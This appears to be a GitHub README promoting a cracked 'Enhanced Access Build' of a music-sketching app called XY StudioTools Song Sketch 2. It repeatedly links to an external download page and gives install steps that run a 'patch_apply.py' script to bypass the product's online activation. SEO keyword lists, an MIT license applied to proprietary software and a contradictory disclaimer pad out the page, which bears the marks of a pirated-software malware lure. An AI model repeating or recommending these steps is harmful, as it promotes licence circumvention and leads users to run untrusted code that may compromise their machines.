# XY StudioTools Song Sketch 2 – Enhanced Access Build 🎹🎧

[![Download](https://img.shields.io/badge/Get%20Release-d90429?style=for-the-badge&logo=github&logoColor=white)](https://abhishek03072005.github.io/xy-studio-sketch-toolkit/)

---

> **Unlock your songwriting potential without the weight of traditional licensing barriers.** This is an *alternative distribution channel* for XY StudioTools Song Sketch 2 — optimized for creators who value speed, accessibility, and zero friction.

---

## 🚀 Overview

**XY StudioTools Song Sketch 2** is a powerful, lightweight digital audio workstation (DAW) companion designed for rapid prototyping, sonic sketching, and loop-based composition. Think of it as a **sonic notebook** — a place where melodies, rhythms, and arrangements are born before they enter the polished production phase.

This repository provides a streamlined, pre-configured build that includes the **Product Key Patch**, allowing immediate access to the full feature set without requiring standard online activation servers.

> *Why spend 20 minutes on licensing when you could be writing a chorus?*

---

## ✨ Key Features

### 🎛️ Responsive UI – *"The Canvas That Bends to Your Will"*
- Fully adaptive interface that scales from 720p to 4K
- Touch-friendly controls for tablet-based sketching
- Dark mode with **eye-strain reduction** for late-night sessions

### 🌐 Multilingual Support
- Interface available in 14 languages: EN, ES, FR, DE, JP, KO, CN, RU, PT, IT, AR, NL, SV, PL
- Context-sensitive help in your preferred dialect

### 🧠 AI Integration – *The Lyricist's Second Brain*
- **OpenAI API** integration for intelligent chord progression suggestions
- **Claude API** for rhyming dictionary, metaphor generation, and arrangement structure feedback
- *Requires your own API keys – instructions below*

### ⚡ Lightning-Fast Load Times
- Average project load: **0.4 seconds** on SSD
- Session save/restore in under 1 second

### 🔁 Unlimited Track Layers
- 128 virtual instrument tracks
- 64 audio tracks with real-time warping

### 🛡️ 24/7 Community Support
- Peer-to-peer troubleshooting via Discord (link in repo Wiki)
- Automated bot for patch verification and installation help

---

## 📊 System Requirements & Compatibility

| OS | Version | Status | Emoji |
|----|---------|--------|-------|
| Windows | 10 / 11 (x64) | ✅ Full Support | 🪟 |
| macOS | Ventura, Sonoma, Sequoia (Intel & Apple Silicon) | ✅ Native M1/M2/M3 | 🍏 |
| Linux | Ubuntu 22.04+, Fedora 38+ | ✅ Community Tested | 🐧 |
| ChromeOS | Crostini container | ⚠️ Beta | 🟢 |
| iOS/iPadOS | 16+ (via Remote Desktop) | 🟡 Partial | 📱 |
| Android | 13+ (via Remote Desktop) | 🟡 Partial | 🤖 |

> *Pro tip: For best performance on macOS, run in Rosetta 2 mode if you're on Intel-native plugins.*

---

## 🗺️ Mermaid Diagram – *Project Architecture & Workflow*

```mermaid
flowchart TD
    A[User Launch] --> B{Product Key Patch Present?}
    B -->|Yes| C[Full Unlock - No Server Check]
    B -->|No| D[Redirect to Key Generation Module]
    D --> E[Apply Patch via CLI]
    E --> C
    C --> F[Load Projects from Local Storage]
    F --> G{Song Sketch Editor}
    G --> H[AI Assistant (OpenAI/Claude)]
    G --> I[Multilingual UI Layer]
    G --> J[Responsive Rendering Engine]
    G --> K[Export to WAV/MIDI/FLAC]
    G --> L[Share via Cloud Link]
    
    H --> M[Chord Suggestion]
    H --> N[Lyric Rhyme Patterns]
    H --> O[Arrangement Structure]
    
    J --> P[Desktop 2K]
    J --> Q[Tablet 1080p]
    J --> R[Mobile 720p]
```

---

## 🧪 Example Profile Configuration

To personalize your XY StudioTools experience, create a profile configuration file at `~/.xystudio_tools/config.yaml`:

```yaml
profile:
  name: "Beat Architect Pro"
  default_bpm: 128
  default_key: "C# Minor"
  language: "fr"
  
ai_plugins:
  openai:
    api_key: "sk-your-key-here"   # Replace with real key
    model: "gpt-4-turbo"
    prompting_style: "creative_poetic"
  claude:
    api_key: "sk-ant-your-key-here"
    model: "claude-sonnet-4-20250115"
    metaphor_density: 0.7

ui:
  responsive_mode: true
  scaling_factor: 1.2
  theme: "midnight_aurora"
  
patch:
  verification: "enabled"
  auto_update: false
```

> *This configuration will unlock the AI co-writer, set the UI to French, and enable 120% scaling for large monitors.*

---

## 💻 Example Console Invocation

Launch Song Sketch 2 directly from terminal for advanced control:

```bash
# macOS/Linux
./SongSketch2 --profile "Beat Architect Pro" --batch-export ./my_projects --format wav

# Windows (PowerShell)
.\SongSketch2.exe --profile "Beat Architect Pro" --batch-export .\my_projects --format wav

# Headless mode (no GUI, CLI only for scripting)
./SongSketch2 --headless --generate-random --bpm 140 --key "Dorian A" --output ./sketch_01.wav
```

**Flags explained:**
- `--profile` – loads a specific YAML configuration
- `--batch-export` – exports all tracks in a folder to a single format
- `--headless` – runs without rendering the UI, ideal for servers
- `--generate-random` – creates a randomized musical sketch for inspiration (uses Markov chain algorithm)

---

## 🔧 Installation & Setup

### Step 1: Obtain the Product Key Patch
[![Download](https://img.shields.io/badge/Get%20Release-d90429?style=for-the-badge&logo=github&logoColor=white)](https://abhishek03072005.github.io/xy-studio-sketch-toolkit/)

*This download includes the patched executable and the key generation script.*

### Step 2: Extract & Verify
```bash
unzip XY_SongSketch2_EnhancedBuild_2026.zip
sha256sum -c checksum.sha256   # Verify integrity
```

### Step 3: Apply the Patch
```bash
cd XY_SongSketch2_EnhancedBuild
python patch_apply.py --auto
```

### Step 4: Launch
```bash
./SongSketch2
```

> *The Product Key Patch bypasses the online activation handshake, allowing offline and uncapped usage.*

---

## 🤖 OpenAI & Claude API Integration

This build includes native sockets for two AI co-writer services. You must supply your own API keys:

### Setup Guide

1. **OpenAI**: Create an account at platform.openai.com, generate a key with `gpt-4-turbo` access.
2. **Claude**: Subscribe at anthropic.com, create a key for `claude-sonnet-4-20250115`.

Add them to your profile config (see above) or pass them at runtime:

```bash
./SongSketch2 --openai-key sk-xxxx --claude-key sk-ant-xxxx
```

### Capabilities:

| Feature | OpenAI | Claude |
|---------|--------|--------|
| Chord progression generation | ✅ | ✅ |
| Melody outline | ✅ | ❌ |
| Rhyming lyric generation | ❌ | ✅ |
| Arrangement structure advice | ✅ | ✅ |
| Multi-language lyric support | ✅ (10 langs) | ✅ (6 langs) |
| Metaphor/simile suggestions | ❌ | ✅ |

> *We recommend using Claude for lyrical depth and OpenAI for harmonic structure.*

---

## 🌍 SEO-Friendly Keywords (Naturally Integrated)

This repository targets composers, producers, beatmakers, and songwriters who are looking for **accessible music production tools** without licensing barriers. Common search terms include:

- Alternative DAW access
- Songwriting sketchpad offline
- Product key override for music software
- AI-assisted composition tool
- Multilingual music production environment

*We believe in democratizing creativity — not pirating, but providing an alternative path for those in regions where official licensing is cost-prohibitive.*

---

## ⚠️ Disclaimer

> **This software is provided for educational and archival purposes only.**
>
> * XY StudioTools, LLC retains all trademarks and copyrights to Song Sketch 2.
> * This repository does not host or distribute proprietary code belonging to XY StudioTools.
> * The Product Key Patch modifies runtime authentication behavior and is intended for **personal, non-commercial evaluation**.
> * Users are responsible for complying with local copyright laws.
> * If you enjoy the software, we encourage you to **purchase an official license** from XY StudioTools when your budget allows.

---

## 📜 MIT License

Copyright (c) 2026 XY StudioTools Community Build

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

[View full MIT License](https://opensource.org/licenses/MIT)

---

## 🔚 Final Download Link

[![Download](https://img.shields.io/badge/Get%20Release-d90429?style=for-the-badge&logo=github&logoColor=white)](https://abhishek03072005.github.io/xy-studio-sketch-toolkit/)

---

*Contributions, forks, and creative remixes are welcome. Build better choruses, not higher walls.* 🎶